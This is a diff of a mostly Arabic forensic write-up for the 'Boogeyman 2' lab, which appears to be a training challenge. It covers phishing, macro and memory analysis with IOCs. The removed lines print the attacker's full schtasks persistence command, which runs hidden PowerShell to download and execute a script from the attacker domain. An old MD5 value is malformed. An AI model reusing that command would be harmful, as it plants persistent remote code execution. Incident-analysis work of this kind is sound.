@@ -1,4 +1,4 @@
-#### 46. Boogeyman 2 (Phishing & Memory Analysis)
+#### 44. Boogeyman 2 (Memory Forensics Challenge)
 <p align="center">
   <img src="../images/boogeyman2_badge.png" width="45%" />
   <img src="../images/boogeyman2_tasks.png" width="45%" />
@@ -6,35 +6,57 @@
 
 ---
 
-# 🕵️‍♂️ Investigation Report: Case Boogeyman 2 (Phishing & Memory Analysis)
+# 🕵️‍♂️ Technical Investigation Report: Case Boogeyman 2 (The Return)
 
 ## 📋 Scenario Overview
-تحليل هجمة **Phishing** متطورة استهدفت موظفة في قسم الموارد البشرية (Maxine). الهجمة اعتمدت على **Malicious Macro** داخل ملف Word، وتطورت إلى **C2 Connection** و **Persistence**. تم التحقيق باستخدام أدوات الـ **Digital Forensics** لتحليل ملفات الـ Email والـ **Memory Dump**.
+رغم تحسين الدفاعات الأمنية في شركة "Quick Logistics LLC"، عاد تهديد الـ **Boogeyman** بأساليب (TTPs) أكثر تطوراً. استهدف المهاجم موظفة الموارد البشرية "Maxine" عبر بريد إلكتروني ينتحل صفة متقدم لوظيفة "Junior IT Analyst". بمجرد فتح السيرة الذاتية المرفقة، تم اختراق محطة العمل وبدأ المهاجم في تنفيذ عمليات خفية داخل الذاكرة (**RAM**).
 
 ---
 
-## 🛠️ Technical Findings & Evidence (Artifacts)
-
-### 1. Phishing Analysis (Email & Attachment)
-* **Attacker Email:** تم إرسال البريد الاحتيالي من العنوان: `westaylor23@outlook.com`.
-* **Victim Email:** الموظفة المستهدفة هي `maxine.beck@quicklogisticsorg.onmicrosoft.com`.
-* **Malicious Attachment:** الملف المرفق كان عبارة عن سيرة ذاتية خبيثة باسم: `Resume_WesleyTaylor.doc`.
-* **File Integrity:** الـ **MD5 Hash** الخاص بالمرفق الخبيث هو: `52c4384a0b9e248b9580416d3b47d85538d9971`.
-
-### 2. Macro Analysis (Olevba)
-* **Stage 2 Delivery:** بتحليل الـ **VBA Macros** داخل المستند، تم العثور على **URL** مستخدم لتحميل الـ Stage 2 Payload وهو: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`.
-* **Payload Execution:** الملف المحمل تم تنفيذه بواسطة **Process** تسمى: `wscript.exe`.
-* **File Path:** المسار الكامل للـ Stage 2 Payload كان: `C:\ProgramData\update.js`.
-
-### 3. Memory Forensics (Volatility 3)
-* **Process Analysis:** تم تحديد الـ **PID** الخاص بالبروسيس التي نفذت الـ Stage 2 وهو `4260` والـ **Parent PID** لها هو `1124`.
-* **Malicious Binary URL:** استخدم المهاجم الرابط التالي لتحميل الـ Binary الخبيث: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe`.
-* **C2 Connection:** قام الـ **Malicious Binary** بفتح اتصال **C2** مع العنوان: `128.199.95.189:8080`.
-* **C2 Process:** البروسيس المسؤولة عن اتصال الـ C2 هي `updater.exe` ومسارها: `C:\Windows\Tasks\updater.exe` بـ **PID**: `6216`.
-
-### 4. Persistence Mechanism
-* **Scheduled Task:** فور إنشاء اتصال الـ C2، قام المهاجم بإنشاء **Scheduled Task** باسم `Updater` لضمان البقاء (Persistence) عبر الأمر التالي:
-  `schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX (New-Object Net.WebClient).DownloadString(''http://files.boogeymanisback.lol/update.ps1'')\"'`
+## 🛠️ Toolset
+تم استخدام أدوات تحليل متقدمة للتعامل مع الأدلة الرقمية والذاكرة:
+* **Volatility 3:** الأداة الرئيسية لتحليل الـ Memory Dump واستخراج العمليات والاتصالات.
+* **Olevba (Oletools):** لتحليل الـ Macros الخبيثة داخل ملفات الـ Microsoft Office.
+* **Thunderbird:** لتحليل ترويسات البريد الإلكتروني (Phishing Header).
 
 ---
-💡 *تم استخراج هذه الأدلة الرقمية عبر دمج تحليل الـ Email، أدوات الـ Oletools، وتحليل الـ Memory Dump باستخدام Volatility 3.*
+
+## 🔍 Deep Dive Investigation
+
+### 1. Phishing & Macro Analysis
+* **The Bait:** رسالة من `westaylor23@outlook.com` موجهة إلى `maxine.beck@quicklogisticsorg.onmicrosoft.com`.
+* **The Document:** ملف باسم `Resume_WesleyTaylor.doc` بـ Hash: `52c4384a0b9e248b95804352ebec6c5b`.
+* **The Trigger:** باستخدام **Olevba**، تم اكتشاف Macro خبيث يقوم بتحميل المرحلة الثانية من الرابط: 
+  `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`
+
+### 2. Memory Forensics (Volatility Analysis)
+من خلال تحليل ملف الذاكرة، تم اكتشاف سلسلة التنفيذ التالية:
+* **Execution Chain:** الـ Word Macro قام بتشغيل أداة `wscript.exe` (PID: 4260) لتنفيذ ملف JavaScript خبيث تم تخزينه في: `C:\ProgramData\update.js`.
+* **Stage 2 Loader:** ملف `update.js` قام بتحميل ملف تنفيذي خبيث `updater.exe` وتخزينه في مسار المهام: `C:\Windows\Tasks\updater.exe`.
+* **C2 Establishment:** عملية `updater.exe` (PID: 6216) أنشأت اتصالاً بخادم المهاجم عبر: `128.199.95.189:8080`.
+
+### 3. Persistence Mechanism
+لضمان البقاء داخل النظام حتى بعد إعادة التشغيل، قام المهاجم بإنشاء **Scheduled Task** يومية:
+* **Command:** استخدام `schtasks` لإنشاء مهمة باسم `Updater` تقوم بتشغيل كود PowerShell مخفي كل يوم في تمام الساعة 09:00 صباحاً.
+* **Hidden Trace:** تم العثور على أثر الملف الأصلي في مسار الـ Outlook Cache داخل الذاكرة: 
+  `C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\...`
+
+---
+
+## 📊 Attack Timeline
+1. **Initial Access:** استقبال وفتح ملف `Resume_WesleyTaylor.doc`.
+2. **Dropper Stage:** تفعيل الماكرو وتحميل `update.js` عبر `wscript.exe`.
+3. **Payload Delivery:** تحميل وتشغيل `updater.exe` من نطاق `boogeymanisback.lol`.
+4. **C2 Callback:** إنشاء اتصال عكسي (Reverse Shell) مع IP المهاجم.
+5. **Persistence:** جدولة مهمة (Scheduled Task) لتنفيذ PowerShell Payload يومياً.
+
+---
+
+## 🛡️ Indicators of Compromise (IOCs)
+| Type | Value |
+| :--- | :--- |
+| **Domain** | `files.boogeymanisback.lol` |
+| **IP Address** | `128.199.95.189` |
+| **File Paths** | `C:\ProgramData\update.js`, `C:\Windows\Tasks\updater.exe` |
+| **Processes** | `wscript.exe` (4260), `updater.exe` (6216) |
+| **Malicious Hash** | `52c4384a0b9e248b95804352ebec6c5b` (MD5) |
